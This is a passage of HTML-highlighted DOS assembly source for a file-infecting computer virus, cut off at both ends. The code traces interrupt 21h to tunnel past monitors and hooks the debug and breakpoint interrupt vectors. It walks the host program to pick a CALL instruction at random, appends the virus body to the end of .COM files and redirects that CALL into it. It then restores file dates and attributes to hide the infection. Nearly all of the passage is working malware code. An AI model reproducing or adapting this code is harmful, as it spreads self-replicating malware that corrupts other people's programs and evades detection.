        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0CDh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                   </span><span class="sc1">;cl0se file.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">nocom</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">int21</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±± First Int 01 Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">tunn</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;trace int 21 f0r tunneling.</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getret</span><span class="sc0">                    </span><span class="sc1">;get next instructi0n address in es:di.</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FC80h</span><span class="sc0">           </span><span class="sc1">;is an 'cmp ax, ??'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">fuera</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">   </span><span class="sc1">;avoid 'cmp ax, 24h'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">fuera</span><span class="sc0">

</span><span class="sc5">stop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">            </span><span class="sc1">;make int 03h point to true int 21h ;)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">                          </span><span class="sc1">;trace m0de 0ff.</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">fuera</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±± Int CDh Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">fndhst</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;detect h0st c0de at exec.</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getret</span><span class="sc0">                    </span><span class="sc1">;get next instructi0n dir.</span><span class="sc0">

</span><span class="sc5">chkhst</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">102h</span><span class="sc0">                  </span><span class="sc1">;ensure it's h0st start :)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">nohost</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">firstb</span><span class="sc0">       </span><span class="sc1">;rest0re first h0st w0rd in mem0ry.</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">path</span><span class="sc0">                  </span><span class="sc1">;0pen file.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">firstb</span><span class="sc0">                </span><span class="sc1">;rest0re first w0rd 0f file.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setdate</span><span class="sc0">                   </span><span class="sc1">;rest0re file date &amp; time.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                   </span><span class="sc1">;cl0se file.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setattr</span><span class="sc0">                   </span><span class="sc1">;rest0re file attributes.</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;rest0re int CDh vect0r.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">intcddes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0CDh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">intcdseg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0CDh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fndcal</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;change int 01h vect0r</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">;t0 find a call.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">numinstr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">;max number 0f instr. t0 trace.</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">;ramd0m ch0se 0f call t0 infect (2-5).</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">numcall</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">                        </span><span class="sc1">;rest0re 0riginal IP (100h) 0n stack.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">                          </span><span class="sc1">;trace m0de 0n</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">nohost</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±± Second Int 01 Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">fndcal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;trace h0st t0 find a call t0 infect.</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">numinstr</span><span class="sc0">               </span><span class="sc1">;check instructi0n trace limit.</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">goon</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">off</span><span class="sc0">

</span><span class="sc5">goon</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getret</span><span class="sc0">                    </span><span class="sc1">;get ret address.</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lstdsp</span><span class="sc0">             </span><span class="sc1">;d0 n0t c0unt 0ne m0re instructi0n</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">norep</span><span class="sc0">                     </span><span class="sc1">;0n 'rep' prefixed instructi0ns.</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">numinstr</span><span class="sc0">

</span><span class="sc5">norep</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lstdsp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">             </span><span class="sc1">;st0re actual return 0ffset.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Dh</span><span class="sc0">                   </span><span class="sc1">;check f0r a p0pf.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">chkirt</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                   </span><span class="sc1">;ensure trap flag will be 0n.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">nocall</span><span class="sc0">

</span><span class="sc5">chkirt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">                  </span><span class="sc1">;check f0r a iret.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">chkint</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                   </span><span class="sc1">;ensure trap flag will be 0n.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">anocall</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">nocall</span><span class="sc0">

</span><span class="sc5">chkint</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">                  </span><span class="sc1">;check f0r a int xx.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">chkint3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                   </span><span class="sc1">;skip ints 20h, 21h &amp; 20h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">anocall</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">anocall</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">anocall</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">numint</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">;int number t0 perf0rm call.</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                        </span><span class="sc1">;inc ret addr t0 step 0ver int call.</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc5">numint</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">                  </span><span class="sc1">;perf0rm int call in virus c0de.</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">chkint3</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">                  </span><span class="sc1">;check int 03h call.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">chkcal</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                </span><span class="sc1">;step 0ver int call.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">nocall</span><span class="sc0">

</span><span class="sc5">chkcal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                  </span><span class="sc1">;check f0r a call t0 infect.</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">found</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">nocall</span><span class="sc0">

</span><span class="sc5">found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">numcall</span><span class="sc0">                </span><span class="sc1">;it's the nice 0ne ;)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">go</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">numinstr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">           </span><span class="sc1">;d0n't be s0 extrict in call number</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">   </span><span class="sc5">go</span><span class="sc0">                        </span><span class="sc1">;if there are t00 few calls.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">nocall</span><span class="sc0">

</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">chgattr</span><span class="sc0">                   </span><span class="sc1">;change attributes.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                 </span><span class="sc1">;0pen file.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdate</span><span class="sc0">                   </span><span class="sc1">;get file date &amp; time.</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;m0ve t0 file call positi0n.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">                 </span><span class="sc1">;read call fr0m file f0r c0mpress chk.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc5">check</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">               </span><span class="sc1">;c0mpressed file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">ok</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;m0ves t0 end 0f file.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">                            </span><span class="sc1">;dx &lt;- 0 ;)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">hostsize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;find call parameter.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">hostsize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;f0r a new "call hostsize".</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;0ffset t0 return t0 h0st</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">retonno</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">                 </span><span class="sc1">;save mi c0de at file end.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;m0ves again t0 call.</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hostsize</span><span class="sc0">              </span><span class="sc1">;change it. }:)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setdate</span><span class="sc0">                   </span><span class="sc1">;rest0re file time &amp; date.</span><span class="sc0">

